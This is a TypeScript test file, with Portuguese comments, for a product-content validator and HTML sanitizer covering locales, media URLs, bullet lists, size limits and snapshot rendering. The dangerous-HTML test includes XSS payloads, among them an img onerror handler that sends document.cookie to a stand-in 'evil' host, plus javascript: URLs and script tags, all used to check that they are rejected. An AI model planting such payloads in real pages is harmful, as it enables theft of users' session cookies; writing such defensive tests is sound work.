// Testes do motor puro de validacao de conteudo/midia de produto.
// Roda com o runner nativo do Node: `npm test` (node --test), sem dependencias.
import { test } from "node:test";
import assert from "node:assert/strict";
import { validarConteudoProduto, sanitizarHtml, fichaDoSnapshot, detalhesDoSnapshot, type Falha } from "./produto-conteudo.ts";

function campos(r: ReturnType<typeof validarConteudoProduto>): string[] {
  return r.ok ? [] : r.falhas.map((f: Falha) => f.campo);
}

test("conteúdo + mídia válidos normalizam", () => {
  const r = validarConteudoProduto({
    product_id: "prod-1",
    content: [
      { locale: "pt-BR", description_html: "<p>Curso</p>", highlights: ["Aulas", "Certificado"], inclusions: "Material\nCoffee", is_machine_translated: false },
      { locale: "en", description_html: "<p>Course</p>", is_machine_translated: true },
    ],
    media: [{ url: "https://x.com/a.jpg", kind: "image", caption: "Fachada" }],
  });
  assert.ok(r.ok);
  if (!r.ok) return;
  assert.equal(r.valor.content.length, 2);
  assert.deepEqual(r.valor.content[0].highlights, ["Aulas", "Certificado"]);
  assert.deepEqual(r.valor.content[0].inclusions, ["Material", "Coffee"]); // string -> lista por linha
  assert.equal(r.valor.content[1].is_machine_translated, true);
  assert.equal(r.valor.media[0].url, "https://x.com/a.jpg");
  assert.equal(r.valor.media[0].sort, 0);
});

test("conjunto vazio é válido (produto sem ficha)", () => {
  const r = validarConteudoProduto({ product_id: "p", content: [], media: [] });
  assert.ok(r.ok && r.valor.content.length === 0 && r.valor.media.length === 0);
});

test("product_id obrigatório", () => {
  assert.ok(campos(validarConteudoProduto({ content: [], media: [] })).includes("product_id"));
});

test("locale inválido falha; locale duplicado falha", () => {
  assert.ok(campos(validarConteudoProduto({ product_id: "p", content: [{ locale: "fr", description_html: "x" }] })).some((c) => c.includes("locale")));
  const dup = validarConteudoProduto({ product_id: "p", content: [{ locale: "pt-BR", description_html: "a" }, { locale: "pt-BR", description_html: "b" }] });
  assert.ok(!dup.ok && campos(dup).some((c) => c.includes("locale")));
});

test("locale sem nenhum conteúdo é descartado (não grava linha vazia)", () => {
  const r = validarConteudoProduto({
    product_id: "p",
    content: [{ locale: "pt-BR", description_html: "", highlights: [], inclusions: [], exclusions: [] }, { locale: "en", description_html: "hi" }],
  });
  assert.ok(r.ok);
  if (r.ok) {
    assert.equal(r.valor.content.length, 1);
    assert.equal(r.valor.content[0].locale, "en");
  }
});

test("mídia: URL obrigatória e precisa ser http/https", () => {
  assert.ok(campos(validarConteudoProduto({ product_id: "p", media: [{ caption: "sem url" }] })).some((c) => c.includes("media[0].url")));
  assert.ok(campos(validarConteudoProduto({ product_id: "p", media: [{ url: "javascript:alert(1)" }] })).some((c) => c.includes("media[0].url")));
  assert.ok(campos(validarConteudoProduto({ product_id: "p", media: [{ url: "/local/foto.jpg" }] })).some((c) => c.includes("media[0].url")));
  const ok = validarConteudoProduto({ product_id: "p", media: [{ url: "http://x.com/a.png" }] });
  assert.ok(ok.ok);
});

test("mídia: sort default = índice; preservado quando informado", () => {
  const r = validarConteudoProduto({
    product_id: "p",
    media: [{ url: "https://x.com/1.jpg" }, { url: "https://x.com/2.jpg", sort: 5 }],
  });
  assert.ok(r.ok);
  if (r.ok) {
    assert.equal(r.valor.media[0].sort, 0);
    assert.equal(r.valor.media[1].sort, 5);
  }
});

test("bullets: array e string por linha; vazios filtrados", () => {
  const r = validarConteudoProduto({
    product_id: "p",
    content: [{ locale: "pt-BR", highlights: ["  A  ", "", "B"], exclusions: "X\n\n Y " }],
  });
  assert.ok(r.ok);
  if (r.ok) {
    assert.deepEqual(r.valor.content[0].highlights, ["A", "B"]);
    assert.deepEqual(r.valor.content[0].exclusions, ["X", "Y"]);
  }
});

test("rejeita HTML perigoso na descrição (script/handler/iframe/javascript:)", () => {
  const casos = [
    "<script>alert(1)</script>",
    "<img src=x onerror=\"fetch('https://evil/'+document.cookie)\">",
    "<iframe src=https://evil></iframe>",
    "<a href=\"javascript:alert(1)\">x</a>",
  ];
  for (const html of casos) {
    const r = validarConteudoProduto({ product_id: "p", content: [{ locale: "pt-BR", description_html: html }] });
    assert.ok(!r.ok && campos(r).some((c) => c.includes("description_html")), `esperava rejeitar: ${html}`);
  }
  // HTML de formatação simples continua válido.
  const ok = validarConteudoProduto({ product_id: "p", content: [{ locale: "pt-BR", description_html: "<p><b>Curso</b> ótimo</p>" }] });
  assert.ok(ok.ok);
});

test("limites: descrição muito longa e excesso de mídia falham; bullets são cortados", () => {
  const longa = "a".repeat(20001);
  assert.ok(campos(validarConteudoProduto({ product_id: "p", content: [{ locale: "pt-BR", description_html: longa }] })).some((c) => c.includes("description_html")));

  const muitas = Array.from({ length: 41 }, (_, i) => ({ url: `https://x.com/${i}.jpg` }));
  assert.ok(campos(validarConteudoProduto({ product_id: "p", media: muitas })).includes("media"));

  const muitosBullets = Array.from({ length: 100 }, (_, i) => `item ${i}`);
  const r = validarConteudoProduto({ product_id: "p", content: [{ locale: "pt-BR", highlights: muitosBullets }] });
  assert.ok(r.ok && r.valor.content[0].highlights.length === 60);
});

test("corpo não-objeto falha limpo", () => {
  assert.ok(!validarConteudoProduto(null).ok);
  assert.ok(!validarConteudoProduto([]).ok);
});

// ── sanitizarHtml (render-time) ──────────────────────────────────────────────
test("sanitizarHtml remove <script> e mantém só o texto escapado", () => {
  const out = sanitizarHtml('<script>alert(1)</script>Olá');
  assert.ok(!/<script/i.test(out));
  assert.ok(!/<\/script/i.test(out));
  assert.ok(out.includes("alert(1)")); // texto interno preservado, inerte
  assert.ok(out.includes("Olá"));
});

test("sanitizarHtml descarta tags não permitidas e todos os atributos", () => {
  // img com onerror -> tag inteira descartada (nenhum atributo é copiado)
  assert.equal(sanitizarHtml('<img src=x onerror="alert(1)">'), "");
  // <a href=javascript:...> não está na allowlist -> descartado, texto fica
  assert.equal(sanitizarHtml('<a href="javascript:alert(1)">link</a>'), "link");
  // p permitido, mas onclick some (re-emitimos sem atributos)
  assert.equal(sanitizarHtml('<p onclick="x()">oi</p>'), "<p>oi</p>");
});

test("sanitizarHtml mantém formatação segura e converte \\n em <br>", () => {
  assert.equal(sanitizarHtml("<strong>Bold</strong> e <em>itálico</em>"), "<strong>Bold</strong> e <em>itálico</em>");
  assert.equal(sanitizarHtml("linha1\nlinha2"), "linha1<br>linha2");
  assert.equal(sanitizarHtml("<ul><li>a</li><li>b</li></ul>"), "<ul><li>a</li><li>b</li></ul>");
});

test("sanitizarHtml escapa < > & soltos e trata entrada não-string", () => {
  assert.equal(sanitizarHtml("a < b & c > d"), "a &lt; b &amp; c &gt; d");
  assert.equal(sanitizarHtml(null), "");
  assert.equal(sanitizarHtml(123), "");
  assert.equal(sanitizarHtml(""), "");
});

// ── fichaDoSnapshot ──────────────────────────────────────────────────────────
const SNAP = [
  { locale: "pt-BR", description_html: "<p>Curso</p><script>x</script>", highlights: ["15h/sem", ""], inclusions: [], exclusions: [], is_machine_translated: false },
  { locale: "en", description_html: "Course", highlights: [], inclusions: ["Books"], exclusions: [], is_machine_translated: true },
];

test("fichaDoSnapshot escolhe o locale e sanitiza a descrição", () => {
  const f = fichaDoSnapshot(SNAP, "pt-BR");
  assert.ok(f);
  assert.equal(f!.locale, "pt-BR");
  assert.equal(f!.descriptionHtml, "<p>Curso</p>x"); // script removido; texto inerte
  assert.deepEqual(f!.highlights, ["15h/sem"]); // vazio filtrado
});

test("fichaDoSnapshot cai para pt-BR e depois para o primeiro disponível", () => {
  const soEn = [SNAP[1]];
  const f = fichaDoSnapshot(soEn, "es"); // es ausente, pt-BR ausente -> primeiro (en)
  assert.ok(f);
  assert.equal(f!.locale, "en");
  assert.equal(f!.isMachineTranslated, true);
  assert.deepEqual(f!.inclusions, ["Books"]);
});

test("fichaDoSnapshot retorna null sem conteúdo utilizável", () => {
  assert.equal(fichaDoSnapshot([], "pt-BR"), null);
  assert.equal(fichaDoSnapshot(null, "pt-BR"), null);
  assert.equal(fichaDoSnapshot([{ locale: "pt-BR", description_html: "", highlights: [], inclusions: [], exclusions: [] }], "pt-BR"), null);
});

test("fichaDoSnapshot inclui mídia; filtra URL não-http e ordena por sort", () => {
  const media = [
    { url: "https://cdn/x2.jpg", kind: "image", sort: 2, caption: "sala" },
    { url: "javascript:alert(1)", kind: "image", sort: 0, caption: "xss" }, // descartada
    { url: "https://cdn/x1.jpg", kind: "image", sort: 1, caption: null },
    { url: "https://cdn/v.mp4", kind: "video", sort: 3, caption: null },
    { url: "ftp://x/doc.pdf", kind: "document", sort: 4 }, // descartada (não http)
  ];
  const f = fichaDoSnapshot(SNAP, "pt-BR", media);
  assert.ok(f);
  assert.deepEqual(f!.midias.map((m) => m.url), ["https://cdn/x1.jpg", "https://cdn/x2.jpg", "https://cdn/v.mp4"]);
  assert.equal(f!.midias[2].kind, "video");
});

test("fichaDoSnapshot: só mídia (sem texto) ainda rende ficha; kind default = image", () => {
  const soMidia = fichaDoSnapshot([], "pt-BR", [{ url: "https://cdn/a.jpg", kind: "banana", sort: 0 }]);
  assert.ok(soMidia);
  assert.equal(soMidia!.descriptionHtml, "");
  assert.equal(soMidia!.midias.length, 1);
  assert.equal(soMidia!.midias[0].kind, "image"); // kind desconhecido -> image
  // sem texto e sem mídia utilizável -> null
  assert.equal(fichaDoSnapshot([], "pt-BR", [{ url: "javascript:x", kind: "image", sort: 0 }]), null);
});

// ── detalhesDoSnapshot (Fase A2) ─────────────────────────────────────────────
test("detalhesDoSnapshot: snapshot vazio devolve blocos nulos", () => {
  const d = detalhesDoSnapshot({});
  assert.equal(d.programa, null);
  assert.equal(d.acomodacao, null);
  assert.equal(d.escola, null);
});

test("detalhesDoSnapshot: programa gera Quick Info e timetable, com labels pt-BR", () => {
  const d = detalhesDoSnapshot({
    programDetail: {
      education_type: "General English",
      delivery_method: "in_person",
      lessons_per_week: 25,
      hours_per_week: 20.8,
      grades: ["1", "2", "3"],
      is_pathway: false,
      includes_activities: true,
      timetable: { Segunda: ["08:30-10:10", "10:20-12:00"] },
    },
  });
  assert.ok(d.programa);
  const rot = d.programa!.quickInfo.map((l) => `${l.rotulo}=${l.valor}`);
  assert.ok(rot.includes("Modalidade=Presencial"));
  assert.ok(rot.includes("Aulas por semana=25"));
  assert.ok(rot.includes("Carga horária=20.8 h/semana"));
  assert.ok(rot.includes("Níveis=1, 2, 3"));
  assert.ok(rot.includes("Atividades incluídas=Sim"));
  assert.ok(!rot.some((r) => r.startsWith("Pathway"))); // false não vira linha
  assert.equal(d.programa!.timetable.length, 1);
  assert.equal(d.programa!.timetable[0].dia, "Segunda");
  assert.equal(d.programa!.timetable[0].blocos.length, 2);
});

test("detalhesDoSnapshot: acomodação mapeia enums para pt-BR e dias da semana", () => {
  const d = detalhesDoSnapshot({
    accommodationDetail: {
      accommodation_type: "homestay",
      room_type: "private",
      bathroom_type: "shared",
      meal_plan: "full_board",
      distance_to_campus_minutes: 30,
      check_in_weekday: 6,
      check_out_weekday: 0,
    },
  });
  assert.ok(d.acomodacao);
  const rot = d.acomodacao!.linhas.map((l) => `${l.rotulo}=${l.valor}`);
  assert.ok(rot.includes("Tipo=Casa de família"));
  assert.ok(rot.includes("Quarto=Individual"));
  assert.ok(rot.includes("Banheiro=Compartilhado"));
  assert.ok(rot.includes("Refeições=Pensão completa"));
  assert.ok(rot.includes("Distância até a escola=30 min"));
  assert.ok(rot.includes("Check-in=Sábado"));
  assert.ok(rot.includes("Check-out=Domingo"));
});

test("detalhesDoSnapshot: escola sanitiza descrição e filtra mídia http", () => {
  const d = detalhesDoSnapshot({
    campus: {
      id: "c1",
      name: "VanWest College",
      city: "Vancouver",
      region: "BC",
      content: [{ locale: "pt-BR", description_html: "<p>Ótima escola</p><script>alert(1)</script>", highlights: ["Turmas pequenas"] }],
      media: [
        { url: "https://ex.com/foto.jpg", kind: "photo", sort: 1, caption: "Fachada" },
        { url: "javascript:alert(1)", kind: "photo", sort: 2 },
      ],
    },
  });
  assert.ok(d.escola);
  assert.equal(d.escola!.nome, "VanWest College");
  assert.equal(d.escola!.local, "Vancouver, BC");
  assert.ok(d.escola!.descriptionHtml.includes("Ótima escola"));
  assert.ok(!d.escola!.descriptionHtml.toLowerCase().includes("<script"));
  assert.deepEqual(d.escola!.highlights, ["Turmas pequenas"]);
  assert.equal(d.escola!.midias.length, 1); // javascript: descartada
  assert.equal(d.escola!.midias[0].kind, "image"); // 'photo' -> image
});
